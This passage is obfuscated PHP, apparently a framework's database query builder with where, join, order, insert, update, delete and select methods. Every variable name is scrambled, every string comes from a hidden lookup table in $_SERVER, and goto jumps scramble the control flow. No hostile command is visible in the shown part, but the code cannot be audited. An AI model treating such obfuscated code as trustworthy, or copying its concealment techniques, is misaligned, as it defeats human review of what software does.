$A‡å¯œæ—¡[491]; } elseif (is_null($bŸ°àã££)) { $bŸ°àã££ = $A‡å¯œæ—¡[102]; } return $bŸ°àã££; } protected function parseField($B¾äÒêã¸) { $eê‡ª«Â´ß =& $_SERVER[ÉóçÄÇ]; if (is_string($B¾äÒêã¸) && strpos($B¾äÒêã¸, $eê‡ª«Â´ß[47])) { $B¾äÒêã¸ = explode($eê‡ª«Â´ß[47], $B¾äÒêã¸); } if (is_array($B¾äÒêã¸)) { $B¿ÇÁ¶öØ = array(); foreach ($B¾äÒêã¸ as $B‘‚°¥¢ => $cÖš£¥ï) { if (!is_numeric($B‘‚°¥¢)) { $B¿ÇÁ¶öØ[] = $this->parseKey($B‘‚°¥¢, !1) . $eê‡ª«Â´ß[937] . $this->parseKey($cÖš£¥ï); } else { $B¿ÇÁ¶öØ[] = $this->parseKey($cÖš£¥ï); } } $AÕ‡„ÒÒ Ä = implode($eê‡ª«Â´ß[47], $B¿ÇÁ¶öØ); } elseif (is_string($B¾äÒêã¸) && !empty($B¾äÒêã¸)) { $AÕ‡„ÒÒ Ä = $B¾äÒêã¸; } else { $AÕ‡„ÒÒ Ä = $eê‡ª«Â´ß[182]; } return $AÕ‡„ÒÒ Ä; } protected function parseTable($c¯ö¥ «’Ö) { $Bî‚¦—ÛÈæ =& $_SERVER[ÉóçÄÇ]; if (is_array($c¯ö¥ «’Ö)) { $BË¤Æ±‘¶Ä = array(); foreach ($c¯ö¥ «’Ö as $eÅÊÑ™è¾¼ => $d½…½„’±œ) { if (!is_numeric($eÅÊÑ™è¾¼)) { $BË¤Æ±‘¶Ä[] = $this->parseKey($eÅÊÑ™è¾¼) . $Bî‚¦—ÛÈæ[50] . $this->parseKey($d½…½„’±œ); } else { $BË¤Æ±‘¶Ä[] = $this->parseKey($eÅÊÑ™è¾¼); } } $c¯ö¥ «’Ö = $BË¤Æ±‘¶Ä; } elseif (is_string($c¯ö¥ «’Ö)) { if (strstr($c¯ö¥ «’Ö, $Bî‚¦—ÛÈæ[50])) { return $c¯ö¥ «’Ö; } $c¯ö¥ «’Ö = explode($Bî‚¦—ÛÈæ[47], $c¯ö¥ «’Ö); array_walk($c¯ö¥ «’Ö, array($this, $Bî‚¦—ÛÈæ[848])); } return $Bî‚¦—ÛÈæ[842] . trim(implode($Bî‚¦—ÛÈæ[938], $c¯ö¥ «’Ö), $Bî‚¦—ÛÈæ[380]) . $Bî‚¦—ÛÈæ[842]; } protected function parseWhere($fÔ•áÜ‚˜‘) { $a×Î®è¶ =& $_SERVER[ÉóçÄÇ]; $dÛš­¹œÕï = $a×Î®è¶[33]; if (is_string($fÔ•áÜ‚˜‘)) { $dÛš­¹œÕï = $fÔ•áÜ‚˜‘; } else { $c¸Ü·ŠŠ® = isset($fÔ•áÜ‚˜‘[$a×Î®è¶[939]]) ? strtoupper($fÔ•áÜ‚˜‘[$a×Î®è¶[939]]) : $a×Î®è¶[33]; if (in_array($c¸Ü·ŠŠ®, array($a×Î®è¶[940], $a×Î®è¶[941], $a×Î®è¶[942]))) { $c¸Ü·ŠŠ® = $a×Î®è¶[50] . $c¸Ü·ŠŠ® . $a×Î®è¶[50]; unset($fÔ•áÜ‚˜‘[$a×Î®è¶[939]]); } else { $c¸Ü·ŠŠ® = $a×Î®è¶[943]; } foreach ($fÔ•áÜ‚˜‘ as $A…Ú­ÒÃÛ => $aœµøÌÕ›) { $dÛš­¹œÕï .= $a×Î®è¶[273]; if (is_numeric($A…Ú­ÒÃÛ)) { $A…Ú­ÒÃÛ = $a×Î®è¶[944]; } if (0 === strpos($A…Ú­ÒÃÛ, $a×Î®è¶[70])) { $dÛš­¹œÕï .= $this->parseThinkWhere($A…Ú­ÒÃÛ, $aœµøÌÕ›); } else { if (!preg_match($a×Î®è¶[945], trim($A…Ú­ÒÃÛ))) { think_exception(think_lang($a×Î®è¶[946]) . $a×Î®è¶[4] . $A…Ú­ÒÃÛ); } $bİ£†Ê¿‹¸ = is_array($aœµøÌÕ›) && isset($aœµøÌÕ›[$a×Î®è¶[947]]); $A…Ú­ÒÃÛ = trim($A…Ú­ÒÃÛ); if (strpos($A…Ú­ÒÃÛ, $a×Î®è¶[279])) { $a³¦¢—ã¬­ = explode($a×Î®è¶[279], $A…Ú­ÒÃÛ); $C©ªøë’‰ = array(); foreach ($a³¦¢—ã¬­ as $B„Ş§ÖĞ¿Ú => $F­¢éøâ­†) { $DÅˆó…Ù´¦ = $bİ£†Ê¿‹¸ ? $aœµøÌÕ›[$B„Ş§ÖĞ¿Ú] : $aœµøÌÕ›; $C©ªøë’‰[] = $a×Î®è¶[256] . $this->parseWhereItem($this->parseKey($F­¢éøâ­†), $DÅˆó…Ù´¦) . $a×Î®è¶[847]; } $dÛš­¹œÕï .= implode($a×Î®è¶[948], $C©ªøë’‰); } elseif (strpos($A…Ú­ÒÃÛ, $a×Î®è¶[280])) { $a³¦¢—ã¬­ = explode($a×Î®è¶[280], $A…Ú­ÒÃÛ); $C©ªøë’‰ = array(); foreach ($a³¦¢—ã¬­ as $B„Ş§ÖĞ¿Ú => $F­¢éøâ­†) { $DÅˆó…Ù´¦ = $bİ£†Ê¿‹¸ ? $aœµøÌÕ›[$B„Ş§ÖĞ¿Ú] : $aœµøÌÕ›; $C©ªøë’‰[] = $a×Î®è¶[256] . $this->parseWhereItem($this->parseKey($F­¢éøâ­†), $DÅˆó…Ù´¦) . $a×Î®è¶[847]; } $dÛš­¹œÕï .= implode($a×Î®è¶[943], $C©ªøë’‰); } else { $dÛš­¹œÕï .= $this->parseWhereItem($this->parseKey($A…Ú­ÒÃÛ), $aœµøÌÕ›); } } $dÛš­¹œÕï .= $a×Î®è¶[274] . $c¸Ü·ŠŠ®; } $dÛš­¹œÕï = substr($dÛš­¹œÕï, 0, -strlen($c¸Ü·ŠŠ®)); } return empty($dÛš­¹œÕï) ? $a×Î®è¶[33] : $a×Î®è¶[949] . $dÛš­¹œÕï; } protected function parseWhereItem($e¦÷‰‘ª×ó, $EÀ×ˆç§Ñ) { $A¹…¥Ô´Û =& $_SERVER[ÉóçÄÇ]; $då©«¶ËåÀ = $A¹…¥Ô´Û[33]; if (is_array($EÀ×ˆç§Ñ)) { if (is_string($EÀ×ˆç§Ñ[0])) { $Bä•š ¿‚ = strtolower($EÀ×ˆç§Ñ[0]); if (in_array($EÀ×ˆç§Ñ[0], array($A¹…¥Ô´Û[933], $A¹…¥Ô´Û[950], $A¹…¥Ô´Û[951], $A¹…¥Ô´Û[952], $A¹…¥Ô´Û[953], $A¹…¥Ô´Û[954]))) { $då©«¶ËåÀ .= $e¦÷‰‘ª×ó . $A¹…¥Ô´Û[50] . $EÀ×ˆç§Ñ[0] . $A¹…¥Ô´Û[50] . $this->parseValue($EÀ×ˆç§Ñ[1]); } elseif (preg_match($A¹…¥Ô´Û[955], $EÀ×ˆç§Ñ[0])) { $då©«¶ËåÀ .= $e¦÷‰‘ª×ó . $A¹…¥Ô´Û[50] . $this->exp[$Bä•š ¿‚] . $A¹…¥Ô´Û[50] . $this->parseValue($EÀ×ˆç§Ñ[1]); } elseif (preg_match($A¹…¥Ô´Û[956], $EÀ×ˆç§Ñ[0])) { if (is_array($EÀ×ˆç§Ñ[1])) { $bÈƒÙçæÌ  = isset($EÀ×ˆç§Ñ[2]) ? strtoupper($EÀ×ˆç§Ñ[2]) : $A¹…¥Ô´Û[941]; if (in_array($bÈƒÙçæÌ , array($A¹…¥Ô´Û[940], $A¹…¥Ô´Û[941], $A¹…¥Ô´Û[942]))) { $B‘ÕßàºêÊ = array(); foreach ($EÀ×ˆç§Ñ[1] as $CØ‘¼Ş ò) { $B‘ÕßàºêÊ[] = $e¦÷‰‘ª×ó . $A¹…¥Ô´Û[50] . $this->exp[$Bä•š ¿‚] . $A¹…¥Ô´Û[50] . $this->parseValue($CØ‘¼Ş ò); } $då©«¶ËåÀ .= $A¹…¥Ô´Û[256] . implode($A¹…¥Ô´Û[50] . $bÈƒÙçæÌ  . $A¹…¥Ô´Û[50], $B‘ÕßàºêÊ) . $A¹…¥Ô´Û[847]; } } else { $då©«¶ËåÀ .= $e¦÷‰‘ª×ó . $A¹…¥Ô´Û[50] . $this->exp[$Bä•š ¿‚] . $A¹…¥Ô´Û[50] . $this->parseValue($EÀ×ˆç§Ñ[1]); } } elseif ($A¹…¥Ô´Û[293] == $Bä•š ¿‚) { $då©«¶ËåÀ .= $A¹…¥Ô´Û[845] . $e¦÷‰‘ª×ó . $A¹…¥Ô´Û[50] . $EÀ×ˆç§Ñ[1] . $A¹…¥Ô´Û[957]; } elseif (preg_match($A¹…¥Ô´Û[958], $EÀ×ˆç§Ñ[0])) { $då©«¶ËåÀ .= $EÀ×ˆç§Ñ[0]; } elseif (preg_match($A¹…¥Ô´Û[959], $EÀ×ˆç§Ñ[0])) { if (isset($EÀ×ˆç§Ñ[2]) && $A¹…¥Ô´Û[293] == $EÀ×ˆç§Ñ[2]) { $då©«¶ËåÀ .= $e¦÷‰‘ª×ó . $A¹…¥Ô´Û[50] . $this->exp[$Bä•š ¿‚] . $A¹…¥Ô´Û[50] . $EÀ×ˆç§Ñ[1]; } else { if (is_string($EÀ×ˆç§Ñ[1])) { $EÀ×ˆç§Ñ[1] = explode($A¹…¥Ô´Û[47], $EÀ×ˆç§Ñ[1]); } $EŸ½ñ­´é = implode($A¹…¥Ô´Û[47], $this->parseValue($EÀ×ˆç§Ñ[1])); $då©«¶ËåÀ .= $e¦÷‰‘ª×ó . $A¹…¥Ô´Û[50] . $this->exp[$Bä•š ¿‚] . $A¹…¥Ô´Û[845] . $EŸ½ñ­´é . $A¹…¥Ô´Û[847]; } } elseif (preg_match($A¹…¥Ô´Û[960], $EÀ×ˆç§Ñ[0])) { $E¡œÕÖø“¼ = is_string($EÀ×ˆç§Ñ[1]) ? explode($A¹…¥Ô´Û[47], $EÀ×ˆç§Ñ[1]) : $EÀ×ˆç§Ñ[1]; $då©«¶ËåÀ .= $A¹…¥Ô´Û[845] . $e¦÷‰‘ª×ó . $A¹…¥Ô´Û[50] . $this->exp[$Bä•š ¿‚] . $A¹…¥Ô´Û[50] . $this->parseValue($E¡œÕÖø“¼[0]) . $A¹…¥Ô´Û[943] . $this->parseValue($E¡œÕÖø“¼[1]) . $A¹…¥Ô´Û[274]; } else { think_exception(think_lang($A¹…¥Ô´Û[946]) . $A¹…¥Ô´Û[4] . $EÀ×ˆç§Ñ[0]); } } else { $e˜÷Ş®êèº = count($EÀ×ˆç§Ñ); $Eîîõ£œğœ = $A¹…¥Ô´Û[33]; if (is_string($EÀ×ˆç§Ñ[$e˜÷Ş®êèº - 1])) { $Eîîõ£œğœ = isset($EÀ×ˆç§Ñ[$e˜÷Ş®êèº - 1]) ? strtoupper($EÀ×ˆç§Ñ[$e˜÷Ş®êèº - 1]) : $A¹…¥Ô´Û[33]; if (in_array($Eîîõ£œğœ, array($A¹…¥Ô´Û[940], $A¹…¥Ô´Û[941], $A¹…¥Ô´Û[942]))) { $e˜÷Ş®êèº = $e˜÷Ş®êèº - 1; } } else { $Eîîõ£œğœ = $A¹…¥Ô´Û[940]; } for ($F¼­¦ŠÇÙò = 0; $F¼­¦ŠÇÙò < $e˜÷Ş®êèº; $F¼­¦ŠÇÙò++) { $E¡œÕÖø“¼ = is_array($EÀ×ˆç§Ñ[$F¼­¦ŠÇÙò]) ? $EÀ×ˆç§Ñ[$F¼­¦ŠÇÙò][1] : $EÀ×ˆç§Ñ[$F¼­¦ŠÇÙò]; if ($A¹…¥Ô´Û[293] == strtolower($EÀ×ˆç§Ñ[$F¼­¦ŠÇÙò][0])) { $då©«¶ËåÀ .= $A¹…¥Ô´Û[256] . $e¦÷‰‘ª×ó . $A¹…¥Ô´Û[50] . $E¡œÕÖø“¼ . $A¹…¥Ô´Û[957] . $Eîîõ£œğœ . $A¹…¥Ô´Û[50]; } else { $fº³´ñÑéÈ = is_array($EÀ×ˆç§Ñ[$F¼­¦ŠÇÙò]) ? $this->exp[strtolower($EÀ×ˆç§Ñ[$F¼­¦ŠÇÙò][0])] : $A¹…¥Ô´Û[933]; if (!$fº³´ñÑéÈ && is_array($EÀ×ˆç§Ñ[$F¼­¦ŠÇÙò]) && in_array($EÀ×ˆç§Ñ[$F¼­¦ŠÇÙò][0], array($A¹…¥Ô´Û[933], $A¹…¥Ô´Û[950], $A¹…¥Ô´Û[951], $A¹…¥Ô´Û[952], $A¹…¥Ô´Û[953], $A¹…¥Ô´Û[954]))) { $fº³´ñÑéÈ = $EÀ×ˆç§Ñ[$F¼­¦ŠÇÙò][0]; } $då©«¶ËåÀ .= $A¹…¥Ô´Û[256] . $e¦÷‰‘ª×ó . $A¹…¥Ô´Û[50] . $fº³´ñÑéÈ . $A¹…¥Ô´Û[50] . $this->parseValue($E¡œÕÖø“¼) . $A¹…¥Ô´Û[957] . $Eîîõ£œğœ . $A¹…¥Ô´Û[50]; } } $då©«¶ËåÀ = substr($då©«¶ËåÀ, 0, -4); } } else { $då©«¶ËåÀ .= $e¦÷‰‘ª×ó . $A¹…¥Ô´Û[961] . $this->parseValue($EÀ×ˆç§Ñ); } return $då©«¶ËåÀ; } protected function parseThinkWhere($a²­ùÎÎÑ¼, $FÂÇƒº®‚¯) { $añÀµ•åƒ =& $_SERVER[ÉóçÄÇ]; $F¼Ââ¾ÁÎŸ = $añÀµ•åƒ[33]; switch ($a²­ùÎÎÑ¼) { case $añÀµ•åƒ[348]: $F¼Ââ¾ÁÎŸ = $FÂÇƒº®‚¯; break; case $añÀµ•åƒ[944]: $F¼Ââ¾ÁÎŸ = is_string($FÂÇƒº®‚¯) ? $FÂÇƒº®‚¯ : substr($this->parseWhere($FÂÇƒº®‚¯), 6); break; case $añÀµ•åƒ[962]: parse_str($FÂÇƒº®‚¯, $BŞ¼Ëõ×öÁ); if (isset($BŞ¼Ëõ×öÁ[$añÀµ•åƒ[939]])) { $C«”ƒ‡¡…¥ = $añÀµ•åƒ[50] . strtoupper($BŞ¼Ëõ×öÁ[$añÀµ•åƒ[939]]) . $añÀµ•åƒ[50]; unset($BŞ¼Ëõ×öÁ[$añÀµ•åƒ[939]]); } else { $C«”ƒ‡¡…¥ = $añÀµ•åƒ[943]; } $eˆˆêÕ = array(); foreach ($BŞ¼Ëõ×öÁ as $cÓ–ñÂˆ‚– => $cÓµìí»•) { $eˆˆêÕ[] = $this->parseKey($cÓ–ñÂˆ‚–) . $añÀµ•åƒ[961] . $this->parseValue($cÓµìí»•); } $F¼Ââ¾ÁÎŸ = implode($C«”ƒ‡¡…¥, $eˆˆêÕ); break; } return $F¼Ââ¾ÁÎŸ; } protected function parseLimit($f‹ïãô‰‰) { $FˆÏªØ¸é =& $_SERVER[ÉóçÄÇ]; return !empty($f‹ïãô‰‰) ? $FˆÏªØ¸é[48] . $f‹ïãô‰‰ . $FˆÏªØ¸é[50] : $FˆÏªØ¸é[33]; } protected function parseJoin($eéïë†­ï¼) { $Dîº Ä×À =& $_SERVER[ÉóçÄÇ]; $bä’ÑŠ½ìË = $Dîº Ä×À[33]; if (!empty($eéïë†­ï¼)) { if (is_array($eéïë†­ï¼)) { foreach ($eéïë†­ï¼ as $d’¸ÁâÓ’æ => $e‚®ÕŸº†è) { if (!1 !== stripos($e‚®ÕŸº†è, $Dîº Ä×À[963])) { $bä’ÑŠ½ìË .= $Dîº Ä×À[50] . $e‚®ÕŸº†è; } else { $bä’ÑŠ½ìË .= $Dîº Ä×À[964] . $e‚®ÕŸº†è; } } } else { $bä’ÑŠ½ìË .= $Dîº Ä×À[964] . $eéïë†­ï¼; } } $bä’ÑŠ½ìË = preg_replace($Dîº Ä×À[965], think_config($Dîº Ä×À[871]) . $Dîº Ä×À[966], $bä’ÑŠ½ìË); return $bä’ÑŠ½ìË; } protected function parseOrder($b»Ê›‡ÍÒâ) { $EèÍ‚ºŒÒº =& $_SERVER[ÉóçÄÇ]; if (is_array($b»Ê›‡ÍÒâ)) { $Fàºøï¨àÄ = array(); foreach ($b»Ê›‡ÍÒâ as $C·¡íÆ˜™¨ => $bà¤×Œì§) { if (is_numeric($C·¡íÆ˜™¨)) { $Fàºøï¨àÄ[] = $this->parseKey($bà¤×Œì§); } else { $bà¤×Œì§ = in_array(strtoupper(trim($bà¤×Œì§)), array($EèÍ‚ºŒÒº[967], $EèÍ‚ºŒÒº[968])) ? $EèÍ‚ºŒÒº[50] . $bà¤×Œì§ : $EèÍ‚ºŒÒº[33]; if (preg_match($EèÍ‚ºŒÒº[969], $C·¡íÆ˜™¨)) { $Fàºøï¨àÄ[] = $this->parseKey($C·¡íÆ˜™¨) . $bà¤×Œì§; } else { think_exception($EèÍ‚ºŒÒº[970] . $C·¡íÆ˜™¨); } } } $b»Ê›‡ÍÒâ = implode($EèÍ‚ºŒÒº[47], $Fàºøï¨àÄ); } return !empty($b»Ê›‡ÍÒâ) ? $EèÍ‚ºŒÒº[971] . $b»Ê›‡ÍÒâ : $EèÍ‚ºŒÒº[33]; } protected function parseGroup($cçäÀæ“Ö”) { $f”‘ÍÆŞì¤ =& $_SERVER[ÉóçÄÇ]; return !empty($cçäÀæ“Ö”) ? $f”‘ÍÆŞì¤[972] . $cçäÀæ“Ö” : $f”‘ÍÆŞì¤[33]; } protected function parseHaving($d¸§˜ğ‘ÉŒ) { $AİíÑñÃÄµ =& $_SERVER[ÉóçÄÇ]; return !empty($d¸§˜ğ‘ÉŒ) ? $AİíÑñÃÄµ[973] . $d¸§˜ğ‘ÉŒ : $AİíÑñÃÄµ[33]; } protected function parseComment($F‰éĞ…¬“‘) { $aƒ…ñ¶×í =& $_SERVER[ÉóçÄÇ]; return !empty($F‰éĞ…¬“‘) ? $aƒ…ñ¶×í[974] . $F‰éĞ…¬“‘ . $aƒ…ñ¶×í[975] : $aƒ…ñ¶×í[33]; } protected function parseDistinct($aÔí‰ßÊÊ) { $fäÖŒ•¯Éî =& $_SERVER[ÉóçÄÇ]; return !empty($aÔí‰ßÊÊ) ? $fäÖŒ•¯Éî[976] : $fäÖŒ•¯Éî[33]; } protected function parseUnion($a±›š‚–•š) { $bİ·ÍùùÎ² =& $_SERVER[ÉóçÄÇ]; if (empty($a±›š‚–•š)) { return $bİ·ÍùùÎ²[33]; } if (isset($a±›š‚–•š[$bİ·ÍùùÎ²[344]])) { $fäÙ—¾çÑ² = $bİ·ÍùùÎ²[977]; unset($a±›š‚–•š[$bİ·ÍùùÎ²[344]]); } else { $fäÙ—¾çÑ² = $bİ·ÍùùÎ²[978]; } foreach ($a±›š‚–•š as $Bº÷ùÜ²½—) { $f÷öÓá®Ä…[] = $fäÙ—¾çÑ² . (is_array($Bº÷ùÜ²½—) ? $this->buildSelectSql($Bº÷ùÜ²½—) : $Bº÷ùÜ²½—); } return implode($bİ·ÍùùÎ²[50], $f÷öÓá®Ä…); } public function insert($aéÉÔ‡©ïÙ, $C”¾µ¤¢í‡ = array(), $e„á…ÃçØ± = false) { goto D¾š…ÜÛ¢‡; D¾š…ÜÛ¢‡: $A”¿Üö‡ƒ =& $_SERVER[ÉóçÄÇ]; $eÛ­˜é¹º = $fæ¹±ÊÈ² = array(); $this->model = $C”¾µ¤¢í‡[$A”¿Üö‡ƒ[277]]; goto F„´ã¿·Ã; fÔ‹ˆÛ¹·³: $fØ»ÎÊËòñ .= $this->parseComment(!empty($C”¾µ¤¢í‡[$A”¿Üö‡ƒ[350]]) ? $C”¾µ¤¢í‡[$A”¿Üö‡ƒ[350]] : $A”¿Üö‡ƒ[33]); return $this->execute($fØ»ÎÊËòñ, $this->parseBind(!empty($C”¾µ¤¢í‡[$A”¿Üö‡ƒ[281]]) ? $C”¾µ¤¢í‡[$A”¿Üö‡ƒ[281]] : array())); goto c‡Û…­¾®Ê; F„´ã¿·Ã: foreach ($aéÉÔ‡©ïÙ as $F“ë¯×±Œµ => $DÑ—Òğ‚Ûù) { if (is_array($DÑ—Òğ‚Ûù) && $A”¿Üö‡ƒ[293] == $DÑ—Òğ‚Ûù[0]) { $fæ¹±ÊÈ²[] = $this->parseKey($F“ë¯×±Œµ); $eÛ­˜é¹º[] = $DÑ—Òğ‚Ûù[1]; } elseif (is_scalar($DÑ—Òğ‚Ûù) || is_null($DÑ—Òğ‚Ûù)) { $fæ¹±ÊÈ²[] = $this->parseKey($F“ë¯×±Œµ); $eÛ­˜é¹º[] = $this->parseValue($DÑ—Òğ‚Ûù); } } $fØ»ÎÊËòñ = ($e„á…ÃçØ± ? $A”¿Üö‡ƒ[849] : $A”¿Üö‡ƒ[850]) . $A”¿Üö‡ƒ[851] . $this->parseTable($C”¾µ¤¢í‡[$A”¿Üö‡ƒ[275]]) . $A”¿Üö‡ƒ[845] . implode($A”¿Üö‡ƒ[47], $fæ¹±ÊÈ²) . $A”¿Üö‡ƒ[846] . implode($A”¿Üö‡ƒ[47], $eÛ­˜é¹º) . $A”¿Üö‡ƒ[847]; $fØ»ÎÊËòñ .= $this->parseLock(isset($C”¾µ¤¢í‡[$A”¿Üö‡ƒ[798]]) ? $C”¾µ¤¢í‡[$A”¿Üö‡ƒ[798]] : !1); goto fÔ‹ˆÛ¹·³; c‡Û…­¾®Ê: } public function selectInsert($F°Ş“¼•‘Ô, $aº¸Š¹ßä™, $dŠÔ¬Ôà§ = array()) { goto a·‰»­ÇÇè; a·‰»­ÇÇè: $e¹»ÛœÕ°Ï =& $_SERVER[ÉóçÄÇ]; $this->model = $dŠÔ¬Ôà§[$e¹»ÛœÕ°Ï[277]]; if (is_string($F°Ş“¼•‘Ô)) { $F°Ş“¼•‘Ô = explode($e¹»ÛœÕ°Ï[47], $F°Ş“¼•‘Ô); } goto b™œÈ§ßÑ‹; BËÕá•™©: return $this->execute($Cæå®¸¶œÂ, $this->parseBind(!empty($dŠÔ¬Ôà§[$e¹»ÛœÕ°Ï[281]]) ? $dŠÔ¬Ôà§[$e¹»ÛœÕ°Ï[281]] : array())); goto B–î‰âÅ®; b™œÈ§ßÑ‹: array_walk($F°Ş“¼•‘Ô, array($this, $e¹»ÛœÕ°Ï[848])); $Cæå®¸¶œÂ = $e¹»ÛœÕ°Ï[979] . $this->parseTable($aº¸Š¹ßä™) . $e¹»ÛœÕ°Ï[845] . implode($e¹»ÛœÕ°Ï[47], $F°Ş“¼•‘Ô) . $e¹»ÛœÕ°Ï[957]; $Cæå®¸¶œÂ .= $this->buildSelectSql($dŠÔ¬Ôà§); goto BËÕá•™©; B–î‰âÅ®: } public function update($bÑåµ¶—Ûá, $fÉÎÛæÎ®) { $f†‚‘ÀÍé =& $_SERVER[ÉóçÄÇ]; $this->model = $fÉÎÛæÎ®[$f†‚‘ÀÍé[277]]; $E¹ô¥ùõƒ† = $f†‚‘ÀÍé[980] . $this->parseTable($fÉÎÛæÎ®[$f†‚‘ÀÍé[275]]) . $this->parseSet($bÑåµ¶—Ûá) . $this->parseWhere(!empty($fÉÎÛæÎ®[$f†‚‘ÀÍé[271]]) ? $fÉÎÛæÎ®[$f†‚‘ÀÍé[271]] : $f†‚‘ÀÍé[33]) . $this->parseOrder(!empty($fÉÎÛæÎ®[$f†‚‘ÀÍé[361]]) ? $fÉÎÛæÎ®[$f†‚‘ÀÍé[361]] : $f†‚‘ÀÍé[33]) . $this->parseLimit(!empty($fÉÎÛæÎ®[$f†‚‘ÀÍé[288]]) ? $fÉÎÛæÎ®[$f†‚‘ÀÍé[288]] : $f†‚‘ÀÍé[33]) . $this->parseLock(isset($fÉÎÛæÎ®[$f†‚‘ÀÍé[798]]) ? $fÉÎÛæÎ®[$f†‚‘ÀÍé[798]] : !1) . $this->parseComment(!empty($fÉÎÛæÎ®[$f†‚‘ÀÍé[350]]) ? $fÉÎÛæÎ®[$f†‚‘ÀÍé[350]] : $f†‚‘ÀÍé[33]); return $this->execute($E¹ô¥ùõƒ†, $this->parseBind(!empty($fÉÎÛæÎ®[$f†‚‘ÀÍé[281]]) ? $fÉÎÛæÎ®[$f†‚‘ÀÍé[281]] : array())); } public function delete($Aæ¯³›ÌõÎ = array()) { $f¿ªí‘‚­Ê =& $_SERVER[ÉóçÄÇ]; $this->model = $Aæ¯³›ÌõÎ[$f¿ªí‘‚­Ê[277]]; $d‚²ŸÓÌ¼ = $f¿ªí‘‚­Ê[981] . $this->parseTable($Aæ¯³›ÌõÎ[$f¿ªí‘‚­Ê[275]]) . $this->parseWhere(!empty($Aæ¯³›ÌõÎ[$f¿ªí‘‚­Ê[271]]) ? $Aæ¯³›ÌõÎ[$f¿ªí‘‚­Ê[271]] : $f¿ªí‘‚­Ê[33]) . $this->parseOrder(!empty($Aæ¯³›ÌõÎ[$f¿ªí‘‚­Ê[361]]) ? $Aæ¯³›ÌõÎ[$f¿ªí‘‚­Ê[361]] : $f¿ªí‘‚­Ê[33]) . $this->parseLimit(!empty($Aæ¯³›ÌõÎ[$f¿ªí‘‚­Ê[288]]) ? $Aæ¯³›ÌõÎ[$f¿ªí‘‚­Ê[288]] : $f¿ªí‘‚­Ê[33]) . $this->parseLock(isset($Aæ¯³›ÌõÎ[$f¿ªí‘‚­Ê[798]]) ? $Aæ¯³›ÌõÎ[$f¿ªí‘‚­Ê[798]] : !1) . $this->parseComment(!empty($Aæ¯³›ÌõÎ[$f¿ªí‘‚­Ê[350]]) ? $Aæ¯³›ÌõÎ[$f¿ªí‘‚­Ê[350]] : $f¿ªí‘‚­Ê[33]); return $this->execute($d‚²ŸÓÌ¼, $this->parseBind(!empty($Aæ¯³›ÌõÎ[$f¿ªí‘‚­Ê[281]]) ? $Aæ¯³›ÌõÎ[$f¿ªí‘‚­Ê[281]] : array())); } public function select($fÓ§À™ç£ß = array()) { goto båö½Å™»Ú; aßíÕ¸ª”˜: $DğÃ …Ö· = isset($fÓ§À™ç£ß[$A÷“È¥‡¨[345]]) ? $fÓ§À™ç£ß[$A÷“È¥‡¨[345]] : !1; if ($DğÃ …Ö·) { $CˆˆàŒˆŞ = is_string($DğÃ …Ö·[$A÷“È¥‡¨[92]]) ? $DğÃ …Ö·[$A÷“È¥‡¨[92]] : $A÷“È¥‡¨[982] . md5($eÑ§‡Ç×—); $cáµÎ»¤® = think_cache($CˆˆàŒˆŞ, $A÷“È¥‡¨[33], $DğÃ …Ö·); if (!1 !== $cáµÎ»¤®) { return $cáµÎ»¤®; } } $fÏå‘ùŞ°æ = $this->query($eÑ§‡Ç×—, $this->parseBind(!empty($fÓ§À™ç£ß[$A÷“È¥‡¨[281]]) ? $fÓ§À™ç£ß[$A÷“È¥‡¨[281]] : array())); goto c¼Š©„åó¶; båö½Å™»Ú: $A÷“È¥‡¨ =& $_SERVER[ÉóçÄÇ]; $this->model = $fÓ§À™ç£ß[$A÷“È¥‡¨[277]]; $eÑ§‡Ç×— = $this->buildSelectSql($fÓ§À™ç£ß); goto aßíÕ¸ª”˜; c¼Š©„åó¶: if ($DğÃ …Ö· && !1 !== $fÏå‘ùŞ°æ) { think_cache($CˆˆàŒˆŞ, $fÏå‘ùŞ°æ, $DğÃ …Ö·); } return $fÏå‘ùŞ°æ; goto bÆ‹à„ìº; bÆ‹à„ìº: } public function buildSelectSql($C¤ôÒ„­Ò = array()) { goto dÅÍ±›âÑÄ; A›”Ö£ÒØ£: return $Cµ»¬‡‰Ó¤; goto dì‡ƒÉŠóò; dÅÍ±›âÑÄ: $f£ëâ±è™¡ =& $_SERVER[ÉóçÄÇ]; if (isset($C¤ôÒ„­Ò[$f£ëâ±è™¡[349]])) { if (strpos($C¤ôÒ„­Ò[$f£ëâ±è™¡[349]], $f£ëâ±è™¡[47])) { list($CƒŸ¡“ˆ‡‹, $a‡‡ÃÈÒÚ) = explode($f£ëâ±è™¡[47], $C¤ôÒ„­Ò[$f£ëâ±è™¡[349]]); } else { $CƒŸ¡“ˆ‡‹ = $C¤ôÒ„­Ò[$f£ëâ±è™¡[349]]; } $CƒŸ¡“ˆ‡‹ = $CƒŸ¡“ˆ‡‹ ? $CƒŸ¡“ˆ‡‹ : 1; $a‡‡ÃÈÒÚ = isset($a‡‡ÃÈÒÚ) ? $a‡‡ÃÈÒÚ : (is_numeric($C¤ôÒ„­Ò[$f£ëâ±è™¡[288]]) ? $C¤ôÒ„­Ò[$f£ëâ±è™¡[288]] : 20); $b¥ËÖª­…Ö = $a‡‡ÃÈÒÚ * ((int) $CƒŸ¡“ˆ‡‹ - 1); $C¤ôÒ„­Ò[$f£ëâ±è™¡[288]] = $b¥ËÖª­…Ö . $f£ëâ±è™¡[47] . $a‡‡ÃÈÒÚ; } if (think_config($f£ëâ±è™¡[983])) { $F‹‘—†¤Áœ = $f£ëâ±è™¡[984] . md5(serialize($C¤ôÒ„­Ò)); $f–•ì®â…Ó = think_cache($F‹‘—†¤Áœ); if ($f–•ì®â…Ó) { return $f–•ì®â…Ó; } } goto fšàÉõ¸—Á; fšàÉõ¸—Á: $Cµ»¬‡‰Ó¤ = $this->parseSql($this->selectSql, $C¤ôÒ„­Ò); $Cµ»¬‡‰Ó¤ .= $this->parseLock(isset($C¤ôÒ„­Ò[$f£ëâ±è™¡[798]]) ? $C¤ôÒ„­Ò[$f£ëâ±è™¡[798]] : !1); if (isset($F‹‘—†¤Áœ)) { think_cache($F‹‘—†¤Áœ, $Cµ»¬‡‰Ó¤); } goto A›”Ö£ÒØ£; dì‡ƒÉŠóò: } public function parseSql($F÷¡éĞ¸ğÀ, $Dªõ­ŒŠÌŒ = array()) { $D™ØôíÃ„ã =& $_SERVER[ÉóçÄÇ]; $F÷¡éĞ¸ğÀ = str_replace(array($D™ØôíÃ„ã[985], $D™ØôíÃ„ã[986], $D™ØôíÃ„ã[987], $D™ØôíÃ„ã[988], $D™ØôíÃ„ã[989], $D™ØôíÃ„ã[990], $D™ØôíÃ„ã[991], $D™ØôíÃ„ã[992], $D™ØôíÃ„ã[993], 